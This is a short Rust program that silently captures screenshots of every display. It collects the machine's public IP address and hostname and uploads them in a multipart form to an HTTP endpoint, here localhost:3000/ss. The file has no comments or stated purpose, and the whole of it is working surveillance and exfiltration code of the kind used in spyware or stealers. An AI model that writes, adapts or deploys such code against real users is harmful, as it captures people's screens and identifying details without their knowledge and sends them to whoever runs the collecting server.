use screenshots::Screen;
use reqwest::{self, multipart::{Part, Form}};
use tokio::io::AsyncReadExt;
use public_ip;
use gethostname;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let screens = Screen::all().unwrap();
    let mut ss_files: Vec<tokio::fs::File> = vec![];

    for screen in screens {
        let image = screen.capture().unwrap();
        let buffer = image.buffer();

        let ss_source: String = format!("target/{}.png", screen.display_info.id);

        match tokio::fs::write(&ss_source, buffer).await {
            Ok(_) => {
                let ss = tokio::fs::File::open(&ss_source).await?;
                ss_files.push(ss);
            }
            Err(_) => {
                eprintln!("error saving ss")
            }
        }

    }
    let mut form = Form::new();

    for (index, file) in ss_files.iter_mut().enumerate() {

        let mut buf = Vec::new();
        file.read_to_end(&mut buf).await?;

        let part = Part::bytes(buf).file_name(format!("ss_{}", index));

        form = form.part("images", part);
    }

    let ip = match public_ip::addr().await {
        Some(ip) => ip,
        None => std::process::exit(1)
    }.to_string();
    let hostname = gethostname::gethostname().to_string_lossy().to_string();

    form = form.text("ip", ip).text("hostname", hostname);


    let req_client = reqwest::Client::new();

    let res = req_client.post("http://localhost:3000/ss").multipart(form).send().await?;

    println!("response: {:?}", res);

    Ok(())
}
